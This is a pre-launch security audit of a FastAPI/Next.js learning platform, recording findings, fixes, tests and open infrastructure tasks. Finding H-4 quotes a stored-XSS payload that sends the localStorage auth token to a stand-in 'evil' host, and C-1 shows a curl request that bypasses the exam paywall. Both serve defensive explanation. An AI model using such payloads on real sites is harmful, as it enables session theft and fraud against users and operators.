# Pre-launch security audit

Scope: the whole repository — FastAPI backend, Next.js frontend, database
schema and migrations, Docker Compose deployment, CI, and the existing
test suite. Reviewed as an authenticated-application threat model
(OWASP Top 10, with emphasis on broken access control, authentication,
and secrets handling).

**This is not a claim that the application is secure.** It is a record of
what was examined, what was fixed, what was deliberately accepted, and
what still has to be done in infrastructure before launch. Security is a
property of the running system — code, configuration, deployment and
operations — and only the first of those is fully settled here.


> **Status:** three passes. This document is the original audit. A
> pre-launch gate ([GATE.md](GATE.md)) audited it and then remediated the
> code blockers; the infrastructure work that remains is specified as an
> unchecked checklist in [DEPLOYMENT.md](DEPLOYMENT.md).
>
> **Resolved since this document was written:** Next.js upgraded 14.2.35 →
> 16.3.4, clearing the last HIGH runtime advisory (`npm audit --omit=dev
> --audit-level=high` → 0). Frontend dependency auditing added to CI.
>
> **Still open — infrastructure/manual, not code:** production TLS,
> production secrets, OpenAI key rotation, security-log alerting, and a
> verified database restore test. See DEPLOYMENT.md.
>
> **Second pass:** a pre-launch gate re-verified every finding below
> against a production-configured stack and found six defects in this
> document's own fixes — including an X-Forwarded-For spoof that defeated
> the login rate limit, a silent fallback to per-process rate limiting,
> and an unaudited set of frontend dependencies. See **[GATE.md](GATE.md)**.
> Where the two disagree, GATE.md is current.

---

## Architecture as found

| Layer | Implementation |
|---|---|
| API | FastAPI, routers under `/api/v1`, SQLAlchemy 2.x ORM, PostgreSQL |
| AuthN | Stateless HS256 JWT, `Authorization: Bearer`, passlib/bcrypt password hashing |
| Revocation | `users.token_version` embedded in each token; bumped on password reset, "logout everywhere", account deletion |
| One-time links | Opaque 256-bit tokens, stored only as SHA-256 hashes, single-use, expiring (`email_tokens`) |
| AuthZ | `UserRole` enum (student / mentor / admin) |
| Client | Next.js 14 App Router SPA, token in `localStorage`, Zustand store |
| Payments | Paymob, HMAC-SHA512-verified server-to-server webhook is the only confirmation path |
| Rate limiting | slowapi, per-IP |
| Deploy | Docker Compose: Postgres + gunicorn/uvicorn API + Next standalone |

Several things were already done well and were left alone: the
`token_version` revocation scheme, hash-only storage of reset tokens, the
non-enumerating `forgot-password` response, `SELECT … FOR UPDATE` on the
wallet to prevent double-spend, and the deliberate refusal to let the
browser-return URL confirm a payment.

---

## Findings

### CRITICAL

#### C-1 · Certification exam paywall enforced only in the browser
- **Component** `POST /api/v1/exams/{exam_id}/start`, `.../submit`
- **Why it matters** Exams cost 150 EGP and issue a verifiable
  certificate. The entire payment check lived in
  `frontend/src/app/exam/[examId]/page.tsx`, which called
  `getExamPaymentStatus()` and rendered `<ExamPaymentGate>` if unpaid.
  The API itself never looked at `ExamPayment` at all.
- **Attack** `curl -X POST /api/v1/exams/1/start -H "Authorization:
  Bearer <any valid token>"` → full question set, submit, pass, receive a
  real certificate row with a verifiable UUID. Direct revenue loss plus
  devaluation of every legitimately-earned certificate.
- **Fix** `_require_paid_exam()` in `app/controllers/exam_controller.py`
  requires a `confirmed` `ExamPayment` (admins exempt) at both `/start`
  and `/submit`. Re-checking at submit means a refunded or reversed
  payment can't be outrun by an already-open attempt. Returns 402.
- **Tests** `test_unpaid_user_cannot_start_a_certification_exam`,
  `test_a_pending_payment_does_not_unlock_the_exam`,
  `test_paid_user_can_start_the_exam`
- **Remaining risk** A *pending* payment is a claim, not money received;
  the admin confirmation step (now audit-logged) is what makes it real.

---

### HIGH

#### H-1 · Course/tool-course completion could be fabricated
- **Component** `POST /tracks/topics/{id}/progress`, `POST /tool-courses/topics/{id}/progress`
- **Why it matters** Completion is derived from `len(lessons_completed)`
  vs the topic's lesson count, and `lesson_id` was accepted as any
  integer. Tool-course completion writes a `ToolCourseCompletion` row —
  a credential.
- **Attack** POST the same topic N times with arbitrary `lesson_id`
  values → topic marked complete → course marked complete → completion
  record issued, without opening a lesson. `time_spent_minutes` was also
  unbounded and feeds the employer-facing scorecard.
- **Fix** `_validate_progress_targets()` in both controllers verifies the
  lesson/exercise actually belongs to the topic; schema bounds
  `time_spent_minutes` to `0…1440` per call with a running cap.
- **Tests** `test_progress_rejects_a_lesson_from_a_different_topic`,
  `test_progress_rejects_nonexistent_lesson_id`,
  `test_progress_rejects_absurd_and_negative_study_time`

#### H-2 · Quiz answer key served with the quiz
- **Component** `QuizResponse` → `GET /tracks/{slug}`, `GET /tracks/topics/{id}`, tool-course equivalents
- **Why it matters** `Quiz.questions` is one JSON blob holding the prompt
  *and* `correct` / `explanation`, and it was returned verbatim. Anyone
  could read every answer before submitting. The track-detail route was
  additionally unauthenticated (H-3), so this needed no account at all.
- **Fix** A `field_validator` on `QuizResponse.questions` strips
  `correct`, `correct_answer`, `answer`, `explanation` and `solution`.
  Placed on the response model rather than in each controller so every
  present and future route that returns a quiz inherits it. Grading is
  unaffected — it reads the DB row, not the response.
- **Test** `test_quiz_answer_key_is_not_exposed_to_the_taker`

#### H-3 · Full curriculum readable without authentication
- **Component** `GET /tracks/{slug}`, `GET /tool-courses/{slug}`
- **Why it matters** These return every lesson body in the track — the
  product — to anonymous callers, while the sibling
  `GET /tracks/topics/{id}` required a token. The frontend gates all of
  these pages behind `useAuth`, so the exposure was purely an API gap.
- **Fix** Both now require `get_current_user`. The *list* endpoints
  (`GET /tracks/`, `GET /tool-courses/`) stay public — they return
  catalogue summaries with no content.
- **Test** `test_full_course_content_requires_authentication`

#### H-4 · Stored XSS via user-supplied URLs → account takeover
- **Component** `PostCreate.github_url` / `image_url`, `UserUpdate.github_url` / `linkedin_url`; rendered at `frontend/src/app/community/page.tsx:219`
- **Why it matters** React does **not** sanitize `href`. A post with
  `github_url: "javascript:fetch('//evil/?t='+localStorage.getItem('auth-storage'))"`
  executes in the clicking user's origin — and the access token is in
  `localStorage`, so this is a one-click session theft.
- **Fix** Two layers. Server: `validate_public_url()` in
  `app/views/auth.py` rejects any scheme but `http`/`https` on every
  user-writable URL field. Client: `safeUrl()` in
  `frontend/src/lib/utils.ts` re-checks before rendering, covering rows
  written before the validator existed.
- **Tests** `test_dangerous_url_schemes_rejected_on_posts`,
  `test_dangerous_url_schemes_rejected_on_profile`,
  `test_https_urls_are_still_accepted`

#### H-5 · JWT verification accepted tokens it should not have
- **Component** `app/core/security.py`
- **Why it matters** Tokens carried only `sub`, `tv`, `exp`. No `iss`,
  no `aud`, no token-type claim, no `iat`/`nbf`, `require_exp` not
  asserted. Any token signed with this key — from any other service
  sharing it, or a future token of a different purpose — was accepted as
  an access token. A non-numeric `sub` reached `int()` and raised,
  giving an unauthenticated caller a reliable 500.
- **Fix** `create_access_token()` now emits `iss`, `aud`, `typ`, `iat`,
  `nbf`, `jti`; `decode_token()` requires and verifies all of them with
  a pinned algorithm list (never the token's own `alg` header — that is
  the algorithm-confusion bug). `get_current_user()` rejects a
  non-`access` `typ` and validates `sub` shape before converting.
- **Tests** `test_token_with_wrong_audience_rejected`,
  `test_non_access_token_type_rejected`, `test_alg_none_token_rejected`,
  `test_token_signed_with_wrong_secret_rejected`,
  `test_tampered_payload_rejected`, `test_expired_token_rejected`,
  `test_non_numeric_subject_does_not_500`

#### H-6 · Login enabled account enumeration and credential stuffing
- **Component** `POST /auth/login`
- **Why it matters** When the email didn't exist, the handler returned
  before doing any bcrypt work — a ~250ms timing difference that
  scriptably reveals which addresses hold accounts. The only brute-force
  control was a per-IP limit, which does nothing against stuffing spread
  over many hosts.
- **Fix** A dummy bcrypt verification (`verify_password_dummy()`) runs on
  the no-such-user path so both branches cost the same. New
  `app/core/login_guard.py` adds per-`(email, IP)` lockout after
  `LOGIN_MAX_FAILURES` (default 8) for `LOGIN_LOCKOUT_MINUTES`
  (default 15). Keyed on the pair, not the email alone — email-only
  keying would hand an attacker a way to lock any user out of their own
  account.
- **Tests** `test_login_failure_message_is_identical_for_unknown_and_wrong_password`,
  `test_repeated_failed_logins_lock_the_account_out`

#### H-7 · Access token lifetime of 7 days in `localStorage`
- **Component** `ACCESS_TOKEN_EXPIRE_MINUTES=10080`
- **Why it matters** A stolen token was good for a week, and could not be
  individually revoked (only via a `token_version` bump, which logs the
  user out everywhere).
- **Fix** Reduced to 720 minutes (12h). `TokenResponse` now returns
  `expires_in` so the client knows when to stop; the store drops an
  expired token at rehydrate and the axios interceptor refuses to send
  one. See "Accepted risks" for why the token is still in `localStorage`.

---

### MEDIUM

#### M-1 · CORS allowlist included localhost in production
`cors_origins` unconditionally contained `http://localhost:3000`,
`http://127.0.0.1:3000` and `http://localhost:3001` alongside
`allow_credentials=True`. Any page an attacker can get running on one of
those origins could read authenticated responses from the production API.
**Fixed:** localhost entries are added only when not in production;
methods and headers are enumerated instead of `*`. **Tests:**
`test_cors_does_not_reflect_an_arbitrary_origin`,
`test_production_cors_config_excludes_localhost`.

#### M-2 · `APP_ENV` typo silently disabled every production guard
`APP_ENV == "production"` was an exact-match check, so `prod`,
`Production` or a typo left `/docs` public, HSTS off, localhost in CORS,
and the startup config validation skipped. **Fixed:** `Settings.is_production`
now treats anything outside `{development, dev, local, test, testing}` as
production — fail safe, not fail open. Startup validation also now
requires an https `FRONTEND_URL` and rejects a low-entropy `SECRET_KEY`.
**Test:** `test_unknown_app_env_is_treated_as_production`.

#### M-3 · No security response headers
No CSP, HSTS, `X-Content-Type-Options`, `Referrer-Policy`,
`Permissions-Policy`, or frame protection on either service. **Fixed:**
`app/core/http_security.py` adds an API-appropriate set (`default-src
'none'` — no API response should ever load a resource), with a separate
looser policy for the `/docs` page, which only exists outside production.
`frontend/next.config.js` sets a page-level CSP (`camera=(self)`
deliberately kept for exam proctoring) and disables `X-Powered-By`.
**Test:** `test_security_headers_present_on_api_responses`.

#### M-4 · Unhandled exceptions and upstream errors leaked internals
No global exception handler, and `_init_checkout` returned 300 characters
of Paymob's raw response body to the caller. **Fixed:** handlers for
`IntegrityError` (409), `SQLAlchemyError` and bare `Exception` return an
opaque `error_id` while the traceback goes to the server log; the Paymob
body is logged, not returned. **Test:**
`test_error_responses_do_not_leak_internals`.

#### M-5 · `/health` published internal details to anyone
Returned `APP_ENV`, the AI provider and model, whether an API key was
configured, and (non-prod) the raw database error. **Fixed:** in
production it returns only liveness and database reachability.
**Test:** `test_health_endpoint_does_not_leak_provider_details_in_production`.

#### M-6 · Email addresses were not normalized
`EmailStr` does not lowercase, and `users.email` had a case-*sensitive*
unique index. `Sam@x.com` and `sam@x.com` were two accounts that the user
experiences as one broken one, and "email already registered" was not a
reliable duplicate check. **Fixed:** `normalize_email()` applied on
register / login / forgot-password via a shared base model, plus a
`UNIQUE INDEX ON users (lower(email))` in migration `004` (which folds
any pre-existing collisions rather than failing or destroying data). The
concurrent-registration race is now caught via `IntegrityError` → 400
instead of a 500. **Tests:** `test_login_is_case_insensitive_on_email`,
`test_registration_rejects_case_variant_duplicate`.

#### M-7 · Weak password policy
Minimum 8 characters, no upper bound, no common-password rejection.
bcrypt silently ignores everything past 72 **bytes**, so two different
200-character passwords sharing a prefix would both authenticate.
**Fixed:** `validate_password_strength()` — minimum 10, maximum 72 bytes,
≥5 distinct characters, not in a common-password list, not containing the
email local part. Applied to registration and password reset; **not** to
login, where an existing account may predate the policy. bcrypt cost
pinned at 12. **Tests:** `test_weak_passwords_rejected_at_registration`,
`test_overlong_password_rejected_rather_than_silently_truncated`.

#### M-8 · Admin authorization was four copy-pasted string comparisons
`if current_user.role.value != "admin"` inline in each of the four admin
endpoints. One forgotten copy is an admin endpoint open to every student,
and `users.role` was nullable, so `role.value` on a NULL row was a 500 in
an authorization path. **Fixed:** `app/core/authz.py` provides
`require_admin` / `require_roles(...)` as dependencies; role is read from
the database row each request, never from a token claim, so a demotion
takes effect immediately. `users.role` is now `NOT NULL DEFAULT
'student'` (migration `004`), and `_role_of()` still degrades a missing
role to the least-privileged value. Adding INSTRUCTOR / MODERATOR later
means adding an enum member and listing it on the endpoints that should
accept it — no endpoint bodies change. **Tests:**
`test_admin_routes_reject_normal_user` (×4),
`test_admin_routes_reject_anonymous` (×4),
`test_admin_route_reachable_for_a_real_admin`,
`test_demotion_takes_effect_without_reissuing_the_token`.

#### M-9 · No server-side exam time limit
`ExamAttempt` recorded `started_at` but nothing enforced
`duration_minutes`, and `time_spent_seconds` was taken from the client
being timed. A 60-minute exam could be started, researched overnight and
resumed. **Fixed:** `_deadline()` is enforced on both resume and submit
(with a 60s grace); elapsed time is computed server-side from
`started_at` and the client's number is ignored. **Test:**
`test_expired_exam_attempt_cannot_be_submitted`.

#### M-10 · Unbounded input on every LLM-facing field
`MentorMessage.content`, `CodeReviewRequest.code`, `SkillGapRequest.cv_text`,
`AnswerMessage.content`, `ProjectSubmit.description`,
`SubmitSolutionRequest.solution_code` and `HintRequest.stuck_on` had no
length limit. Prompt size is a caller-chosen multiplier on the inference
bill. `INPUT_DEFAULT_MAX_CHARACTERS` existed in config, was stored on
each provider, and was never applied. **Fixed:** explicit `max_length` on
every such field, plus `BaseLLMProvider.clip_input()` as a backstop for
content that reaches a prompt from the database (lesson bodies, rubrics,
stored chat history) where no schema is in the path. **Test:**
`test_oversized_llm_input_rejected_before_it_reaches_the_provider`.

#### M-11 · No rate limits on expensive AI endpoints
Credits metered spend but not burst — a scripted client with a funded
wallet could open hundreds of concurrent provider calls. **Fixed:** per-route
limits on `/mentor/*` (6–20/min), `/challenges/{slug}/submit` (10/h),
`/challenges/{slug}/hint` (20/h) and `/tracks/projects/{id}/submit` (10/h).

#### M-12 · Production database published on the host network
`docker-compose.yml` published `5432:5432`, binding Postgres to every
host interface with a default password of `password`. **Fixed:** the base
compose file only `expose`s the port on the compose network; the
port publish moved to `docker-compose.dev.yml` (development only, and
opt-in — see DEPLOYMENT.md §1.3).
A `:?required` interpolation was *not* used for the password/secret,
because Compose interpolates each file before merging — that would break
`docker compose up` locally. The real production guard is
`app/core/config.py`, which refuses to boot with `APP_ENV=production`
while `DATABASE_URL` still carries the dev credentials.

#### M-13 · Known-vulnerable dependencies
Driven by `pip-audit`, not by guesswork — each round of upgrades was
re-audited until the report came back clean.

| Package | Was | Now | Issue |
|---|---|---|---|
| `python-jose` | 3.3.0 | **removed** | CVE-2024-33663 algorithm confusion; CVE-2024-33664 JWE decompression bomb. Even the fixed 3.5.0 drags in `ecdsa`, whose Minerva timing side channel the maintainers have declined to fix. |
| `PyJWT` | — | 2.13.0 | Replaces python-jose. Actively maintained, no `ecdsa` in its tree, and its `require` option lets us assert claims are *present* rather than merely valid-if-present (H-5). We only ever sign HS256, so nothing of value was lost. |
| `cryptography` | (transitive) | 50.0.0 | Now pinned directly rather than inherited; several advisories through 49.x. |
| `python-multipart` | 0.0.9 | 0.0.32 | CVE-2024-53981 plus the PYSEC-2026-303x DoS series. |
| `starlette` | 0.37.2 | 1.3.1 | CVE-2024-47874 multipart DoS and the PYSEC-2026-2xx series. |
| `fastapi` | 0.111.0 | 0.141.1 | Forced by the Starlette floor — 0.111 capped starlette below the fixed range. |
| `pydantic` / `pydantic-settings` | 2.7.1 / 2.2.1 | 2.13.5 / 2.15.0 | Required by fastapi 0.141 (`pydantic>=2.9`). |
| `python-dotenv` | 1.0.1 | 1.2.2 | PYSEC-2026-2270. |
| `gunicorn` | 22.0.0 | 23.0.0 | CVE-2024-6827 request smuggling. |

The migration off python-jose is a code change, not just a version bump:
`app/core/security.py` and `tests/test_security.py` now use PyJWT. The
`alg=none` test had to hand-assemble its token, because PyJWT refuses to
mint one — which is itself the point.

All 138 tests pass on the upgraded stack and `pip-audit --strict` reports
no known vulnerabilities. `bcrypt` stays pinned at 4.0.1 because passlib
1.7.4 breaks against ≥4.1 — see "Remaining risk". `pip-audit --strict`
now runs in CI, so the next such advisory fails the build rather than
waiting for the next manual audit.

---

### LOW

- **L-1 · Mass assignment** — `UserUpdate` and `PostUpdate` already
  excluded privileged fields, so `role`, `is_verified`, `is_pinned` etc.
  were never reachable. Verified rather than fixed, and locked in by
  `test_user_cannot_promote_themselves_via_profile_update` and
  `test_user_cannot_pin_their_own_post`, which post the full privileged
  body and assert nothing moved.
- **L-2 · Unbounded pagination** — `GET /wallet/transactions?limit=` and
  `/exam-payments/admin/pending?limit=` accepted any integer. Now
  `Query(..., ge=1, le=100/500)`.
- **L-3 · Response-header injection** — `Content-Disposition` in
  `download_dataset` interpolated a DB-controlled `dataset_filename`. Now
  reduced to a safe basename.
- **L-4 · HTML injection in outgoing email** — `full_name` was
  interpolated unescaped into the verification and reset emails. Now
  `html.escape`d.
- **L-5 · Admin grant accepted negative credits** — `credits: int` with
  no bound made a "grant" able to silently debit. Now `gt=0, le=100_000`,
  and the target user must exist.
- **L-6 · Stale one-time tokens** — issuing a new verify/reset token now
  retires the account's outstanding ones of that purpose, and account
  deletion invalidates any unredeemed link. **Tests:**
  `test_issuing_a_new_reset_token_retires_the_previous_one`,
  `test_verification_token_cannot_be_used_as_a_reset_token`.
- **L-7 · Free-text phone number** forwarded to the payment provider is
  now pattern-validated.
- **L-8 · Wallet invariants** — `CHECK (credit_balance >= 0)` and
  non-negative lifetime totals added in migration `004`.
- **L-9 · CI could not catch a committed `.env`** — added an explicit
  check. `.env` and `.env.local` are correctly gitignored and, verified
  against the full history (`git log --all --diff-filter=A`), **have
  never been committed**.
- **L-10 · ESLint was never actually running** — no config file existed,
  so `next lint` prompted interactively and `next build` skipped linting
  entirely. Added `.eslintrc.json`; fixed the two errors it surfaced.

---

### INFO

- **Security logging did not exist.** Added `app/core/security_log.py`
  with a dedicated `security` logger covering login success/failure,
  lockouts, registration, password change/reset request, email
  verification, one-time-token rejection, session revocation, account
  deletion, authorization denials, admin actions, payment webhook
  outcomes, rate-limit hits, and server errors. Emails are masked
  (`a***@example.com`); passwords, hashes, access tokens and
  verify/reset tokens are never passed to it — the module docstring
  states this as a contract for future call sites.
- **No SQL injection was found.** Every query goes through the ORM with
  bound parameters; the only raw SQL is a literal `SELECT 1` health probe
  and the DDL in migration `004`. Covered regardless by
  `test_sql_injection_in_login_is_treated_as_data`.
- **No file upload exists.** `avatar_url` / `image_url` are URL
  references, not uploads, and are now scheme-validated. If uploads are
  added, they need their own review — content-type sniffing, size caps,
  a non-executable storage path, and download authorization.
- **CSRF is not applicable as built.** Authentication is a `Bearer`
  header, never an ambient cookie, so a cross-site request cannot carry
  credentials — the browser will not attach a header it wasn't scripted
  to attach, and the CORS allowlist blocks reading any response. No CSRF
  middleware was added, because middleware that protects nothing is worse
  than none: it implies a guarantee that isn't there. **This changes the
  day authentication moves to cookies** — see below.
- **The one `dangerouslySetInnerHTML`** (`MarkdownLesson.tsx:98`) is
  Prism's own `highlight()` output, which HTML-escapes the source text it
  wraps. Documented in place with a "do not pass anything else here"
  note. All other content goes through `react-markdown`, which does not
  render raw HTML (no `rehype-raw`) and strips `javascript:` URLs.
- **Certificate verification** (`GET /exams/certificates/{uuid}`) is
  public by design and returns the holder's name — that is what makes a
  certificate verifiable. The identifier is an unguessable UUIDv4, so it
  is not enumerable.
- **The local `backend/.env` holds a live OpenAI key.** It is gitignored
  and was never committed. Rotate it before launch as hygiene, since it
  has lived on a development machine.
- **Test isolation** — `tests/conftest.py` reset the schema via
  `alembic downgrade base`, which fails against a database holding rows
  from a previous run (002's downgrade restores a NOT NULL that
  tool-course progress rows violate), aborting the suite with a confusing
  `IntegrityError`. Now drops and recreates the schema, then runs the
  full upgrade chain.

---

## Accepted risks (deliberate, with reasoning)

**Token in `localStorage`.** The brief says not to store long-lived
tokens there without a strong architectural reason. The reason here is
that this is a statically-exported SPA talking to a *separate
cross-origin* API with `Bearer` auth. Moving to `HttpOnly` cookies means
cross-site cookies (`SameSite=None; Secure`), a shared parent domain or a
same-origin proxy, and CSRF tokens on every mutating route — a change to
the auth contract of every endpoint and every client, which is not a
change to make in the same pass as fixing a live paywall bypass. What was
done instead: the token's life went from 7 days to 12 hours, the client
drops it the moment it expires, a strict CSP is in place, the sole
`dangerouslySetInnerHTML` is Prism output, and every user-writable URL
field rejects script-bearing schemes — i.e. the XSS that would exploit
`localStorage` is much harder to plant. **Recommended next step:**
same-origin deployment (frontend proxies `/api`) plus `HttpOnly` cookies
and CSRF tokens.

**Registration reveals whether an email is taken.** `POST /auth/register`
still answers "Email already registered". Every alternative is worse for
a self-serve signup, and the same fact is inferable from any signup form
that refuses duplicates. The 5/minute limit is what stops it being a bulk
oracle. `forgot-password` remains non-enumerating.

**Project submission is the one LLM endpoint not metered by credits.**
Changing that alters product behaviour (users would suddenly need credits
to submit a project), so it was rate-limited (10/hour) rather than
metered. **Recommend** routing it through `deduct_credits()` for
consistency with `/mentor/*`.

---

## Requires infrastructure/deployment configuration

These cannot be fixed in application code and are **blocking for launch**:

1. **`REDIS_URL` must be set.** `docker-compose.yml` runs gunicorn with
   `-w 4`. Without Redis, slowapi keeps per-process counters, so each
   worker enforces its own budget and every documented limit is ~4×
   looser. The same applies to the login lockout. Support is wired up
   (`app/core/limiter.py`, `redis` in requirements) and just needs the
   variable.
2. **The ingress must strip inbound `X-Forwarded-For`.** Rate limiting
   consults it in production; if a client can set it, it can mint a fresh
   rate-limit bucket per request.
3. **`SECRET_KEY`** — `openssl rand -hex 32`, injected from a secret
   manager, never a file in the image. Rotating it logs everyone out.
4. **`POSTGRES_PASSWORD`** and a least-privilege application role
   (no SUPERUSER/CREATEDB/CREATEROLE), `?sslmode=require`, instance on a
   private network. Startup already refuses the dev credentials.
5. **HTTPS terminated at the edge**, with HTTP redirected. HSTS is only
   sent in production and is meaningless without it.
6. **`FRONTEND_URL` / `EXTRA_CORS_ORIGINS`** set to the real https
   origins. Startup refuses to boot in production with an http origin.
7. **`PAYMOB_HMAC_SECRET`** — without it `verify_webhook_hmac()` returns
   False and no payment is ever confirmed.
8. **Log shipping and alerting** on the `security` logger — the events
   are emitted but nothing watches them yet. Alert at minimum on
   `auth.login.locked`, `admin.action`, `payment.webhook` with
   `kind=hmac_rejected`, and `app.error` rate.
9. **Database backups** with a tested restore. Not configured anywhere in
   this repository.
10. **Rotate the OpenAI key** currently in `backend/.env`.

---

## Remaining risk

- **passlib is unmaintained** and pins us to `bcrypt==4.0.1`. Migrating
  to Argon2id (or to the `bcrypt` library directly) with transparent
  rehash-on-login is the right next move; it was out of scope here
  because it touches every stored credential.
- **No token blocklist.** Revocation is `token_version`, which is
  all-sessions-or-nothing. Revoking one device requires refresh tokens
  and server-side session state.
- **The common-password list is a stub.** Production should check
  candidates against the HaveIBeenPwned k-anonymity range API.
- **Proctoring is advisory.** Violations are self-reported by the client;
  a modified client simply doesn't report them. Meaningful proctoring
  needs server-side signal.
- **Admin actions have no approval workflow.** A single compromised admin
  account can confirm payments and grant credits. Actions are logged;
  they are not four-eyed.
- **No automated frontend test suite.** The client-side changes are
  covered by type-checking and lint only.
- **`is_verified` is recorded but never enforced.** No endpoint requires
  a verified email. That is a product decision, but worth making
  deliberately before launch.

---

## Verification performed

```
backend:   138 passed        (42 pre-existing + 96 new security tests)
           alembic upgrade head — clean chain through 004
           schema-drift guard (models <-> migrations) passes
           pip-audit --strict — no known vulnerabilities
frontend:  next lint — 0 errors
           next build — compiled, types valid
runtime:   rebuilt and smoke-tested against the live stack:
             register -> 201, expires_in=43200 (12h, was 7 days)
             login with an UPPERCASED email -> 200 (normalization)
             "password123" at registration -> 422
             PATCH /auth/me {"role":"admin"} -> still role=student
             PATCH /auth/me {"github_url":"javascript:..."} -> 422
             GET /exam-payments/admin/pending as a student -> 403
             GET /tracks/{slug} anonymous -> 401, with a token -> 200
             611 quiz questions scanned across the live catalogue:
               0 still leaking `correct` / `explanation`
             CORS preflight from https://evil.example -> no ACAO header
             security headers present on every response
```

Also verified by static sweep: no inline `role.value` comparisons remain
in any controller, every user-scoped query filters on `current_user.id`,
and all 13 unauthenticated routes are public by design (auth entry
points, the public catalogue, price lists, the certificate-verification
URL, the Paymob callback, and the HMAC-verified webhook).

The security tests are in `backend/tests/test_security.py`, grouped by
vulnerability class. Each asserts that an **attack fails** — they go red
when a guard is removed, which a happy-path test would not.
